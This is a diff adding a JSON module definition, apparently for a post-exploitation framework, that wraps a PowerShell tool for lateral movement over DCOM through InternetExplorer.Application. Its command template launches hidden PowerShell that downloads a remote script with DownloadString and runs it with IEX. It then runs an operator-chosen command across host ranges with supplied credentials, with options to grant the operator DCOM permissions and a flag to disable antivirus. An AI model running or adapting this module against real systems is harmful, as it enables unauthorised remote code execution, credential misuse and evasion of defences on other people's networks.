@@ -1,0 +1,52 @@
+{
+  "base": {
+    "type": "standard",
+    "name": "Invoke-RegisterRemoteSchema",
+    "author": ["Russel Van Tuyl (@Ne0nd0g)"],
+    "credits": ["Nimrod Levy (@el3ct71k)"],
+    "path": ["windows", "x64", "powershell", "lateral", "dcom", "Invoke-RegisterRemoteSchema.json"],
+    "platform": "windows",
+    "arch": "x64",
+    "lang": "PowerShell",
+    "privilege": false,
+    "notes": "\r\n\r\nInvoke-RegisterRemoteSchema function executes commands via InternetExplorer.Application's object using the logged-on user or provided credentials.\r\n\r\nExample:\r\nExecutes cmd /c calc command on 10.211.55.1/24 range using the current logged-on session, and grant privileges if is needed\r\nPS> Invoke-RegisterRemoteSchema -HostList \"10.211.55.1/24\" -Command \"cmd /c calc\" -AutoGrant -Verbose\r\n",
+    "local": ["data", "src", "ScorpionesLabs", "DVS", "DVS.psm1"],
+    "options": [
+      {"name": "Command", "value": "\"cmd /c calc\"", "required": true, "flag": "-Command", "description":"Specifies the command to execute."},
+      {"name": "URLScheme", "value": "", "required": false, "flag": "-URLScheme", "description":"Specifies the URL scheme in order to trigger the execution (Default: dvs)"},
+      {"name": "HostList", "value": null, "required": false, "flag": "-HostList", "description":"Specifies IPAddresses, CIDR ranges or hostnames to interact with (Default: 127.0.0.1)."},
+      {"name": "StageCommand", "value": null, "required": false, "flag": "-StageCommand", "description":"Specifies the Stage command in order to execute the payload (must include %1 in order to use your payload)"},
+      {"name": "NoBracketsDoubleEncoding", "value": null, "required": false, "flag": "-NoBracketsDoubleEncoding", "description":"By triggering this flag, the tool will not perform double URL encoding on brackets"},
+      {"name": "Username", "value": null, "required": false, "flag": "-Username", "description":"Specifies the username to use for access."},
+      {"name": "Password", "value": null, "required": false, "flag": "-Password", "description":"Specifies the password to use for access."},
+      {"name": "AutoGrant", "value": null, "required": false, "flag": "-AutoGrant", "description":"AutoGrant mode allows you to grant yourself permission to the remote DCOM object."},
+      {"name": "SkipPermissionChecks", "value": null, "required": false, "flag": "-SkipPermissionChecks", "description":"Try to blindly launch the remote object, without checking if the principal-identity have access to it using (Will not analyze ACL permissions)."},
+      {"name": "Verbose", "value": null, "required": false, "flag": "-Verbose", "description":"Get Verbose logging"}
+    ],
+    "description": "Invoke-ExecutionCommand function executes commands via DCOM Object using the logged-on user or provided credentials.",
+    "commands": [
+      "powershell.exe",
+      "-nop",
+      "-w", "0",
+      "\"IEX",
+      "(New-Object Net.WebClient).DownloadString('https://raw.githubusercontent.com/ScorpionesLabs/DVS/master/DVS.psm1');",
+      "Invoke-RegisterRemoteSchema",
+      "{{ObjectName}}",
+      "{{Commands}}",
+      "{{HostList}}",
+      "{{Username}}",
+      "{{Password}}",
+      "{{AutoGrant.Flag}}",
+      "{{SkipPermissionChecks.Flag}}",
+      "{{NoBracketsDoubleEncoding.Flag}}",
+      "{{SkipRegAuth.Flag}}",
+      "{{Verbose.Flag}}",
+      "\""
+    ]
+  },
+  "powershell": {
+    "disableav": true,
+    "obfuscate": false,
+    "base64": false
+  }
+}
